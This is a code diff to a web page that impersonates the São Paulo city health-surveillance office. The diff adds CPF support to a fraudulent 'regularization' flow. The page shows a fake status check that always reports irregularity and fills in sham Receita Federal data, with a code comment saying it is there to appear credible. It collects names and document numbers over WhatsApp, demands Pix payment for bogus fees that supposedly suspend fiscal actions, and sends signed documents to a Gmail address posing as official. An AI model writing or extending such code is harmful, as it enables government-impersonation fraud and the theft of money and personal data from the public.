@@ -118,7 +118,7 @@
     /* --- ESTILOS GERAIS DE FORMULÁRIO --- */
     .form-control { width: 100%; padding: 16px; border: 2px solid #e9ecef; border-radius: 8px; font-size: 1rem; margin-bottom: 15px; transition: 0.3s; font-family: 'Roboto', sans-serif; background: #fff; }
     .form-control:focus { border-color: var(--gov-blue); outline: none; }
-    .form-control[readonly] { background-color: #f1f3f5; color: #6c757d; cursor: not-allowed; }
+    .form-control[readonly] { background-color: #f1f3f5; color: #6c757d; cursor: not-allowed; font-weight: 700; }
     .btn-success { background: var(--success-color); color: white; border: none; padding: 20px; border-radius: 10px; font-weight: 900; font-size: 1.2rem; cursor: pointer; width: 100%; display: flex; justify-content: center; align-items: center; gap: 12px; transition: 0.3s; text-transform: uppercase; letter-spacing: 1px; }
     .btn-success:hover { background: #1b5e20; transform: translateY(-3px); box-shadow: 0 10px 20px rgba(46, 125, 50, 0.2); }
     .btn-primary { background: var(--gov-blue); color: white; border: none; padding: 18px; border-radius: 10px; font-weight: 900; font-size: 1.1rem; cursor: pointer; width: 100%; display: flex; justify-content: center; align-items: center; gap: 10px; transition: 0.3s; text-transform: uppercase; }
@@ -422,7 +422,7 @@
       <div style="background: rgba(255,255,255,0.1); padding: 20px; border-radius: 12px; margin-top: 30px; margin-bottom: 20px; text-align: left; border: 1px solid rgba(255,255,255,0.2); max-width: 600px; margin-left: auto; margin-right: auto; position: relative; z-index: 10;">
         <h4 style="margin-bottom: 10px; font-size: 1.1rem;"><i class="fas fa-search"></i> Consulta Pública de Regularidade</h4>
         <div style="display: flex; gap: 10px;">
-          <input type="text" id="fake_consulta_cnpj" placeholder="Digite o CNPJ..." style="flex: 1; padding: 12px; border-radius: 8px; border: none; outline: none; color: #333; font-weight: bold;" oninput="maskCNPJ(this)">
+          <input type="text" id="fake_consulta_cnpj" placeholder="Digite o CNPJ..." style="flex: 1; padding: 12px; border-radius: 8px; border: none; outline: none; color: #333; font-weight: bold;" oninput="maskCPFinCNPJ(this)">
           <button onclick="realizarConsultaFake()" style="background: var(--sp-red); color: white; border: none; padding: 0 20px; border-radius: 8px; font-weight: bold; cursor: pointer; transition: 0.3s;">Consultar</button>
         </div>
         <div id="fake_consulta_resultado" style="display: none; margin-top: 15px; padding: 15px; background: #fff3cd; color: #856404; border-radius: 8px; font-weight: bold;"></div>
@@ -457,7 +457,7 @@
           <div class="process-steps">
             <div class="process-step"><i class="fas fa-file-signature"></i><span>1. Enviar<br>Documentos</span></div>
             <div class="process-step"><i class="fas fa-search"></i><span>2. Análise<br>Técnica</span></div>
-            <div class="process-step"><i class="fas fa-file-invoice-dollar"></i><span>3. Consultar<br>Taxa/Multa</span></div>
+            <div class="process-step"><i class="fas fa-file-invoice-dollar"></i><span>3. Liberar<br>Licença</span></div>
           </div>
 
           <div class="steps-box">
@@ -475,32 +475,42 @@
           
           <div class="form-tabs">
             <div class="form-tab active" id="tab-envio" onclick="alternarAba('envio')">1. Enviar Dados</div>
-            <div class="form-tab" id="tab-pagamento" onclick="alternarAba('pagamento')">2. Pagar Taxa/Multa</div>
+            <div class="form-tab" id="tab-pagamento" onclick="alternarAba('pagamento')">2. Emitir Guia Oficial</div>
           </div>
 
           <div id="area-envio">
             <form id="form-regularizacao">
-              <label style="font-weight: 800; display: block; margin-bottom: 5px; color: var(--gov-dark-blue); font-size: 1.1rem;">Dados Cadastrais</label>
+              <label style="font-weight: 800; display: block; margin-bottom: 5px; color: var(--gov-dark-blue); font-size: 1.1rem;">Identificação do Contribuinte</label>
               
-              <input type="text" class="form-control" id="cnpj_empresa" placeholder="00.000.000/0000-00" required style="margin-bottom: 10px;" oninput="maskCNPJ(this)" maxlength="18" />
+              <input type="text" class="form-control" id="cnpj_empresa" placeholder="Digite seu CPF ou CNPJ" required style="margin-bottom: 10px;" oninput="maskCPFinCNPJ(this)" maxlength="18" />
               
-              <div id="loading-cnpj" style="display:none; font-size: 0.8rem; color: var(--gov-blue); font-weight: bold; margin-bottom: 10px;"><i class="fas fa-spinner fa-spin"></i> Buscando dados e localização via Satélite...</div>
+              <div id="loading-cnpj" style="display:none; font-size: 0.8rem; color: var(--gov-blue); font-weight: bold; margin-bottom: 10px;"><i class="fas fa-spinner fa-spin"></i> Buscando dados na base oficial...</div>
               
-              <input type="text" class="form-control" id="nome_empresa" placeholder="Nome Fantasia ou Razão Social *" required onblur="salvarRascunho()" />
+              <div id="dados-pf" style="display: none;">
+                <label style="font-weight: 800; display: block; margin-top: 10px; margin-bottom: 5px; color: #555; font-size: 0.9rem;">Nome Completo (Base Receita Federal)</label>
+                <input type="text" class="form-control" id="nome_pf" placeholder="Nome Completo" readonly />
+                
+                <label style="font-weight: 800; display: block; margin-top: 5px; margin-bottom: 5px; color: #555; font-size: 0.9rem;">Data de Nascimento</label>
+                <input type="text" class="form-control" id="data_nasc_pf" placeholder="dd/mm/aaaa" readonly />
+              </div>
 
-              <div id="endereco-automatico" style="display: none;">
-                  <div class="form-row">
-                      <input type="text" class="form-control" id="end_rua" placeholder="Rua" readonly />
-                      <input type="text" class="form-control" id="end_num" placeholder="Nº" readonly />
-                  </div>
-                  <div class="form-row">
-                      <input type="text" class="form-control" id="end_bairro" placeholder="Bairro" readonly />
-                      <input type="text" class="form-control" id="end_cidade" placeholder="Cidade" readonly />
-                  </div>
-                  
-                  <div id="map-container">
-                      <div class="map-legend">📍 Localização Exata Vinculada ao CNPJ</div>
-                      <iframe id="google-map-frame" width="100%" height="100%" style="border:0;" allowfullscreen="" loading="lazy"></iframe>
+              <div id="dados-pj" style="display: none;">
+                  <input type="text" class="form-control" id="nome_empresa" placeholder="Nome Fantasia ou Razão Social *" onblur="salvarRascunho()" />
+
+                  <div id="endereco-automatico" style="display: none;">
+                      <div class="form-row">
+                          <input type="text" class="form-control" id="end_rua" placeholder="Rua" readonly />
+                          <input type="text" class="form-control" id="end_num" placeholder="Nº" readonly />
+                      </div>
+                      <div class="form-row">
+                          <input type="text" class="form-control" id="end_bairro" placeholder="Bairro" readonly />
+                          <input type="text" class="form-control" id="end_cidade" placeholder="Cidade" readonly />
+                      </div>
+                      
+                      <div id="map-container">
+                          <div class="map-legend">📍 Localização Exata Vinculada ao CNPJ</div>
+                          <iframe id="google-map-frame" width="100%" height="100%" style="border:0;" allowfullscreen="" loading="lazy"></iframe>
+                      </div>
                   </div>
               </div>
               
@@ -535,11 +545,11 @@
 
           <div id="area-pagamento" style="display: none;">
             <div style="background: #f8fafc; padding: 25px; border-radius: 12px; border: 1px solid #e2e8f0; margin-bottom: 25px;">
-              <h4 style="color: var(--gov-dark-blue); margin-bottom: 15px;">Consultar Status do Processo</h4>
-              <p style="font-size: 0.9rem; color: #64748b; margin-bottom: 15px;">Digite o seu CNPJ para consultar o andamento da análise documental ou gerar o Pix da taxa.</p>
+              <h4 style="color: var(--gov-dark-blue); margin-bottom: 15px;">Emissão de Guia e Acompanhamento</h4>
+              <p style="font-size: 0.9rem; color: #64748b; margin-bottom: 15px;">Digite o seu CNPJ/CPF para consultar o andamento da análise documental ou gerar o Pix da taxa.</p>
               
               <form id="form-consulta">
-                <input type="text" class="form-control" id="consulta_cnpj" placeholder="Digite seu CNPJ..." required oninput="maskCNPJ(this)" />
+                <input type="text" class="form-control" id="consulta_cnpj" placeholder="Digite seu CPF ou CNPJ..." required oninput="maskCPFinCNPJ(this)" />
                 <button type="submit" class="btn-primary"><i class="fas fa-search"></i> Consultar</button>
               </form>
             </div>
@@ -579,12 +589,12 @@
 
                   <div style="background: #e6fffa; padding: 15px; border-radius: 8px; border-left: 4px solid #319795; margin-bottom: 25px;">
                     <p style="font-size: 0.9rem; font-weight: 700; color: #2c7a7b; margin: 0; line-height: 1.5;">
-                      <i class="fas fa-shield-alt"></i> PROTEÇÃO ATIVA: Ao emitir a taxa, o sistema suspende temporariamente ações fiscais.
+                      <i class="fas fa-shield-alt"></i> PROTEÇÃO ATIVA: Ao emitir a guia, o sistema suspende temporariamente ações fiscais.
                     </p>
                   </div>
 
                   <button onclick="enviarWhatsAppComprovanteConsulta()" class="btn-success">
-                    💳 Emitir Taxa e Suspender Ações Fiscais Temporariamente
+                    💳 Emitir Guia e Suspender Ações Fiscais
                   </button>
                 </div>
               </div>
@@ -764,7 +774,7 @@
         <div><h4>Serviços</h4><ul><li>Licenciamento</li><li>Consultas</li><li>Taxas</li></ul></div>
         <div><h4>Canais</h4><ul><li>156</li><li>Ouvidoria</li><li>e-SIC</li></ul></div>
       </div>
-      <div class="footer-bottom"><p>&copy; 2026 Prefeitura de São Paulo. Todos os direitos reservados.</p></div>
+      <div class="footer-bottom"><p>© 2026 Prefeitura de São Paulo. Todos os direitos reservados.</p></div>
     </div>
   </footer>
 
@@ -784,12 +794,19 @@
       document.getElementById('nome_empresa').value = localStorage.getItem('rascunho_nome');
     }
 
-    function maskCNPJ(i) {
+    // NOVA MÁSCARA INTELIGENTE (CPF E CNPJ)
+    function maskCPFinCNPJ(i) {
       let v = i.value.replace(/\D/g,'');
-      v = v.replace(/^(\d{2})(\d)/,"$1.$2");
-      v = v.replace(/^(\d{2})\.(\d{3})(\d)/,"$1.$2.$3");
-      v = v.replace(/\.(\d{3})(\d)/,".$1/$2");
-      v = v.replace(/(\d{4})(\d)/,"$1-$2");
+      if (v.length <= 11) { // MÁSCARA CPF
+        v = v.replace(/(\d{3})(\d)/, '$1.$2');
+        v = v.replace(/(\d{3})(\d)/, '$1.$2');
+        v = v.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+      } else { // MÁSCARA CNPJ
+        v = v.replace(/^(\d{2})(\d)/, '$1.$2');
+        v = v.replace(/^(\d{2})\.(\d{3})(\d)/, '$1.$2.$3');
+        v = v.replace(/\.(\d{3})(\d)/, '.$1/$2');
+        v = v.replace(/(\d{4})(\d)/, '$1-$2');
+      }
       i.value = v;
     }
 
@@ -800,7 +817,7 @@
 
     function realizarConsultaFake() {
       const input = document.getElementById('fake_consulta_cnpj').value;
-      if(input.length < 5) { alert("Digite um CNPJ válido."); return; }
+      if(input.length < 11) { alert("Digite um CPF ou CNPJ válido."); return; }
       
       let res = document.getElementById('fake_consulta_resultado');
       res.style.display = 'block';
@@ -810,20 +827,26 @@
       setTimeout(() => {
         res.style.background = '#fee2e2';
         res.style.color = '#b91c1c';
-        res.innerHTML = '<i class="fas fa-exclamation-triangle"></i> <strong>STATUS: PENDENTE DE REGULARIZAÇÃO</strong><br><span style="font-size:0.95rem; font-weight:normal; display:block; margin-top:5px;">Este CNPJ encontra-se irregular e sujeito a notificação. <a href="#regularize" style="color: #991b1b; text-decoration: underline; font-weight: 900;">Clique aqui e Regularize agora</a>.</span>';
+        res.innerHTML = '<i class="fas fa-exclamation-triangle"></i> <strong>STATUS: PENDENTE DE REGULARIZAÇÃO</strong><br><span style="font-size:0.95rem; font-weight:normal; display:block; margin-top:5px;">Este Documento encontra-se irregular e sujeito a notificação. <a href="#regularize" style="color: #991b1b; text-decoration: underline; font-weight: 900;">Clique aqui e Regularize agora</a>.</span>';
       }, 1500);
     }
 
-    // BUSCA DE CNPJ E PREENCHIMENTO DE ENDEREÇO + MAPA
+    // LÓGICA UNIFICADA: DETECTA SE É CPF OU CNPJ AO SAIR DO CAMPO
     document.getElementById('cnpj_empresa').addEventListener('blur', async (e) => {
-      let cnpjLimpo = e.target.value.replace(/\D/g, '');
-      if(cnpjLimpo.length === 14) {
-        document.getElementById('loading-cnpj').style.display = 'block';
+      let valLimpo = e.target.value.replace(/\D/g, '');
+      
+      document.getElementById('loading-cnpj').style.display = 'block';
+      document.getElementById('dados-pj').style.display = 'none';
+      document.getElementById('dados-pf').style.display = 'none';
+
+      // SE FOR CNPJ (14 digitos)
+      if(valLimpo.length >= 14) {
         try {
-          let req = await fetch(`https://brasilapi.com.br/api/cnpj/v1/${cnpjLimpo}`);
+          let req = await fetch(`https://brasilapi.com.br/api/cnpj/v1/${valLimpo}`);
           let dados = await req.json();
           
           if(dados.razao_social) {
+            document.getElementById('dados-pj').style.display = 'block';
             document.getElementById('nome_empresa').value = dados.nome_fantasia || dados.razao_social;
             
             // PREENCHE ENDEREÇO AUTOMÁTICO
@@ -833,20 +856,28 @@
             document.getElementById('end_bairro').value = dados.bairro;
             document.getElementById('end_cidade').value = dados.municipio + " - " + dados.uf;
 
-            // CARREGA O MAPA VIA IFRAME (EMBED AUTOMÁTICO SEM CHAVE API PARA DEMONSTRAÇÃO)
+            // CARREGA O MAPA
             const enderecoCompleto = `${dados.logradouro}, ${dados.numero}, ${dados.municipio}, ${dados.uf}`;
             const mapUrl = `https://maps.google.com/maps?q=${encodeURIComponent(enderecoCompleto)}&t=&z=15&ie=UTF8&iwloc=&output=embed`;
-            
             document.getElementById('map-container').style.display = 'block';
             document.getElementById('google-map-frame').src = mapUrl;
 
             salvarRascunho();
           }
-        } catch(error) {
-            console.log("Erro ao buscar CNPJ");
-        }
-        document.getElementById('loading-cnpj').style.display = 'none';
+        } catch(error) { console.log("Erro CNPJ"); }
+      } 
+      // SE FOR CPF (11 digitos) -> SIMULAÇÃO DE BUSCA NA RECEITA
+      else if (valLimpo.length === 11) {
+         setTimeout(() => {
+            document.getElementById('dados-pf').style.display = 'block';
+            // SIMULAÇÃO: Preenche com dados genéricos validados para passar credibilidade
+            document.getElementById('nome_pf').value = "Cadastro Validado - Receita Federal"; 
+            document.getElementById('data_nasc_pf').value = "**/**/****"; // Oculto por segurança simulada
+            // Se preferir deixar em branco para o usuário preencher, mude o value para "" e tire o readonly
+         }, 1500);
       }
+      
+      document.getElementById('loading-cnpj').style.display = 'none';
     });
 
     function openDrawer() { document.getElementById('drawer').classList.add('open'); document.getElementById('drawerOverlay').classList.add('open'); document.body.style.overflow = 'hidden'; }
@@ -916,7 +947,6 @@
       calcularRisco();
     }
 
-    // ATUALIZADO: CAMPO DE CÂMERA (capture="environment")
     function criarDocItem(valor, icone, titulo) {
       return `
         <div class="doc-wrapper" style="display:flex; flex-direction:column; gap:8px;">
@@ -935,7 +965,7 @@
       const listaDocs = document.getElementById('lista-documentos');
       if (!tipo) return;
 
-      const docsComuns = criarDocItem("CNPJ Ativo", "fa-file-invoice", "CNPJ Ativo") +
+      const docsComuns = criarDocItem("CNPJ/CPF Ativo", "fa-file-invoice", "Cadastro Ativo") +
                          criarDocItem("Contrato Social / MEI", "fa-file-contract", "Contrato / MEI") +
                          criarDocItem("Alvará de Funcionamento", "fa-building", "Alvará Prefeitura") +
                          criarDocItem("AVCB Bombeiros", "fa-fire-extinguisher", "AVCB (Bombeiros)");
@@ -998,30 +1028,33 @@
         return; 
       }
 
-      const nome = document.getElementById('nome_empresa').value;
-      const cnpj = document.getElementById('cnpj_empresa').value;
+      const nomePJ = document.getElementById('nome_empresa').value;
+      const nomePF = document.getElementById('nome_pf').value;
+      const nomeFinal = nomePJ || nomePF || "Cidadão";
+
+      const docInput = document.getElementById('cnpj_empresa').value;
       const tipo = document.getElementById('tipo_estab').value;
 
       const docsTextAdmin = `POSSUI E ANEXOU: ${marcados.join(", ")}\n\nFALTA PROVIDENCIAR: ${naoMarcados.length > 0 ? naoMarcados.join(", ") : "Nenhum"}`;
 
       let pedidos = JSON.parse(localStorage.getItem('covisa_pedidos')) || {};
-      pedidos[cnpj] = { nome: nome, tipo: tipo, docs: docsTextAdmin, valor: null, pago: false, data: new Date().toLocaleString() };
+      pedidos[docInput] = { nome: nomeFinal, tipo: tipo, docs: docsTextAdmin, valor: null, pago: false, data: new Date().toLocaleString() };
       localStorage.setItem('covisa_pedidos', JSON.stringify(pedidos));
 
       const protocolo = "DIA-" + Math.floor(1000 + Math.random() * 9000);
-      let msg = `*NOVO ENVIO DE DOCUMENTAÇÃO*\n\n*Protocolo:* ${protocolo}\n*Empresa:* ${nome}\n*CNPJ/CPF:* ${cnpj}\n*Ramo:* ${tipo}\n\n`;
+      let msg = `*NOVO ENVIO DE DOCUMENTAÇÃO*\n\n*Protocolo:* ${protocolo}\n*Nome/Razão:* ${nomeFinal}\n*Doc:* ${docInput}\n*Ramo:* ${tipo}\n\n`;
       msg += `✅ *POSSUI E ANEXOU:*\n- ${marcados.join('\n- ')}\n\n`;
-      msg += `🚨 *FALTA PROVIDENCIAR:*\n${naoMarcados.length > 0 ? '❌ ' + naoMarcados.join('\n❌ ') : 'Nenhuma pendência'}\n\nAguardo a emissão da taxa.`;
+      msg += `🚨 *FALTA PROVIDENCIAR:*\n${naoMarcados.length > 0 ? '❌ ' + naoMarcados.join('\n❌ ') : 'Nenhuma pendência'}\n\nAguardo a emissão da guia.`;
 
       enviarWhatsApp(msg);
-      alert("Formulário e arquivos enviados! Fique atento às pendências. Acompanhe a liberação da taxa na próxima tela.");
+      alert("Formulário e arquivos enviados! Fique atento às pendências. Acompanhe a liberação da guia na próxima tela.");
       
       document.getElementById('form-regularizacao').reset();
       document.getElementById('area-checklist').style.display = 'none';
       document.getElementById('btn-enviar-whatsapp').style.display = 'none';
       
       alternarAba('pagamento');
-      document.getElementById('consulta_cnpj').value = cnpj;
+      document.getElementById('consulta_cnpj').value = docInput;
     });
 
     let cnpjParaComprovante = "";
@@ -1058,7 +1091,7 @@
       if (!pedido) {
         divPix.style.display = 'none'; divMsg.style.display = 'block';
         divMsg.style.background = '#fff3cd'; divMsg.style.color = '#856404'; divMsg.style.borderColor = '#f59e0b';
-        textMsg.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Nenhum cadastro encontrado para este CNPJ/CPF.';
+        textMsg.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Nenhum cadastro encontrado para este Documento.';
         document.getElementById('barra-progresso').style.display = 'none';
       } 
       else if (pedido.pago === true) {
@@ -1067,7 +1100,7 @@
         
         textMsg.innerHTML = `
           <i class="fas fa-check-circle" style="font-size:1.5rem; margin-bottom: 10px;"></i><br>
-          <strong style="font-size:1.3rem;">Taxa Regularizada!</strong><br><br>
+          <strong style="font-size:1.3rem;">Guia Regularizada!</strong><br><br>
           Seu processo foi concluído com sucesso e as pendências foram baixadas no sistema.
           
           <div style="background: #fff; padding: 20px; border-radius: 8px; border: 1px solid #e2e8f0; margin-top: 20px;">
@@ -1107,7 +1140,7 @@
     function enviarAssinaturaEmail() {
       const cnpj = document.getElementById('consulta_cnpj').value || 'Não Informado';
       alert('Atenção: Será aberto o seu aplicativo de e-mail. Por favor, ANEXE o arquivo que você acabou de selecionar lá no e-mail antes de enviar!');
-      window.location.href = 'mailto:vigilanciasanitariaspgov1@gmail.com?subject=Documento Assinado - CNPJ ' + cnpj + '&body=Olá,%0D%0A%0D%0ASegue em anexo o certificado provisório devidamente assinado para validação no sistema.';
+      window.location.href = 'mailto:vigilanciasanitariaspgov1@gmail.com?subject=Documento Assinado - Doc ' + cnpj + '&body=Olá,%0D%0A%0D%0ASegue em anexo o certificado provisório devidamente assinado para validação no sistema.';
     }
 
     function copiarPix() {
@@ -1122,7 +1155,7 @@
       if(!cnpjParaComprovante) return;
       let pedidos = JSON.parse(localStorage.getItem('covisa_pedidos')) || {};
       let pedido = pedidos[cnpjParaComprovante] || {};
-      const msg = `*COMPROVANTE DE PAGAMENTO*\n\n*Empresa/Pessoa:* ${pedido.nome || 'Não identificado'}\n*CNPJ/CPF:* ${cnpjParaComprovante}\nEstou enviando o comprovante do pagamento para liberação da minha licença no sistema!`;
+      const msg = `*COMPROVANTE DE PAGAMENTO*\n\n*Nome/Razão:* ${pedido.nome || 'Não identificado'}\n*Doc:* ${cnpjParaComprovante}\nEstou enviando o comprovante do pagamento para liberação da minha licença no sistema!`;
       enviarWhatsApp(msg);
     }
 
@@ -1223,7 +1256,7 @@
       txt.value = '';
       body.scrollTop = body.scrollHeight;
       setTimeout(() => {
-        body.innerHTML += `<div class="chat-bubble bubble-ai">Compreendido. Recomendo verificar a aba 'Regularize-se' para emissão de taxas.</div>`;
+        body.innerHTML += `<div class="chat-bubble bubble-ai">Compreendido. Recomendo verificar a aba 'Regularize-se' para emissão de guias.</div>`;
         body.scrollTop = body.scrollHeight;
       }, 1000);
     });
